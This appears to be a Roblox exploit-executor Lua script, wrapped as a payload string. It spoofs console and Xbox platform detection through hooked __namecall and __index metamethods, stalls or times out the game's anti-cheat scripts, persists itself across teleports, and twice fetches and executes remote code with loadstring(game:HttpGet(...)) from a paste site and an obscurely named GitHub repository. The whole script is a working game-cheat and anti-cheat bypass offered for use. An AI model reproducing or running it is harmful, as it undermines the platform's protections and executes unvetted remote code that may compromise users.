local CONSOLE_QOT_FILE = "experiment_console_qot.lua"

--[[
  Same as the no-kick version: IsTenFootInterface namecall ASAP.
  On PC/Console: also race Hyphon in ASAP so the namecall does not memory-bomb ~3s later.
]]
local CONSOLE_QOT_PAYLOAD = [[
local HUB_PLACE = 10179538382
local PC_PLACE = 13643807539
local CONSOLE_PLACE = 15124180230
local QOT_FILE = "experiment_console_qot.lua"
local HYPHON_URL = "https://pastefy.app/DdpWWNDc/raw"

local function get_queue()
    return queue_on_teleport
        or (syn and syn.queue_on_teleport)
        or (fluxus and fluxus.queue_on_teleport)
        or (secure_load and secure_load.queue_on_teleport)
        or KRNL_QUEUE_ON_TELEPORT
end

local qt = get_queue()
if qt and (game.PlaceId == HUB_PLACE or game.PlaceId == CONSOLE_PLACE) then
    qt("loadstring(readfile('" .. QOT_FILE .. "'))()")
end

local function apply_console_hooks(hub_traceback)
    if getgenv().__ExperimentConsoleHooked then
        return
    end
    getgenv().__ExperimentConsoleHooked = true

    local UserInputService = game:GetService("UserInputService")
    local GuiService = game:GetService("GuiService")

    local OldNamecall
    OldNamecall = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
        local Method = getnamecallmethod()

        if Method == "IsTenFootInterface" then
            return true
        elseif Method == "GetPlatform" then
            return Enum.Platform.XBoxOne
        end

        if hub_traceback and game.PlaceId == HUB_PLACE then
            local Traceback = debug.traceback()
            if Traceback:match("PlayerGui") then
                local lp = game:GetService("Players").LocalPlayer
                local SourceName = Traceback:gsub(
                    string.format("Players.%s.PlayerGui.", lp.Name),
                    ""
                )
                if SourceName:len() > 32 then
                    return task.wait(9e9)
                end
            end
        end

        return OldNamecall(self, ...)
    end))

    pcall(function()
        local OldIsTenFootInterface
        OldIsTenFootInterface = hookfunction(GuiService.IsTenFootInterface, newcclosure(function(self)
            if not checkcaller() then
                return true
            end
            return OldIsTenFootInterface(self)
        end))
    end)

    local oldIndex
    oldIndex = hookmetamethod(game, "__index", newcclosure(function(self, index)
        if checkcaller() then
            return oldIndex(self, index)
        end
        if self == UserInputService and tostring(getcallingscript()) ~= "ControlModule" then
            if index == "TouchEnabled"
                or index == "MouseEnabled"
                or index == "KeyboardEnabled" then
                return false
            elseif index == "GamepadEnabled"
                or index == "ControllerEnabled" then
                return true
            end
        end
        return oldIndex(self, index)
    end))
end

local function hyphon_engine_ready()
    local ok, ready = pcall(function()
        local engine = filtergc("function", { StartLine = 2102, IgnoreExecutor = true }, true)
        if not engine then
            return false
        end
        for _, Object in pairs(getnilinstances()) do
            if Object:IsA("Script") and Object.Name:len() == 32 then
                return true
            end
        end
        return false
    end)
    return ok and ready
end

local function emulate_hyphon()
    if getgenv().HyphonReady == true then
        return true
    end

    -- Wait for engine (do not call pastefy early — it kicks if missing).
    local start = tick()
    repeat
        if hyphon_engine_ready() then
            break
        end
        task.wait()
    until tick() - start > 15

    local ok = pcall(function()
        loadstring(game:HttpGet(HYPHON_URL))()
        repeat task.wait() until getgenv().HyphonReady == true
    end)

    return ok and getgenv().HyphonReady == true
end

-- Same as no-kick build: namecall IsTenFootInterface immediately.
apply_console_hooks(game.PlaceId == HUB_PLACE)

if game.PlaceId == HUB_PLACE then
    game:GetService("ScriptContext"):SetTimeout(1)

    local HyphonScript = nil
    local function FindHyphonScript()
        for _, Object in pairs(getnilinstances()) do
            if Object:IsA("Script") and Object.Name:len() == 32 then
                HyphonScript = Object
            end
        end
    end
    repeat
        FindHyphonScript()
        task.wait()
    until HyphonScript

    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/d4e6f8a0b2c4d6e8f0a2c4e6f8a0b2c4d6/cloudflare-global/refs/heads/main/asdwasd.lua"))()
    end)

    qt = get_queue()
    if qt then
        qt("loadstring(readfile('" .. QOT_FILE .. "'))()")
    end

elseif game.PlaceId == PC_PLACE or game.PlaceId == CONSOLE_PLACE then
    -- Namecall already on (no kick). Race Hyphon ASAP to stop ~3s memory bomb.
    task.spawn(function()
        if not emulate_hyphon() then
            warn("join Console | Hyphon emulator failed")
        end
    end)

    if game.PlaceId == PC_PLACE then
        repeat task.wait() until not game.ReplicatedFirst:FindFirstChild("Intro")
        game:GetService("ScriptContext"):SetTimeout(9e9)
    end
end
]]
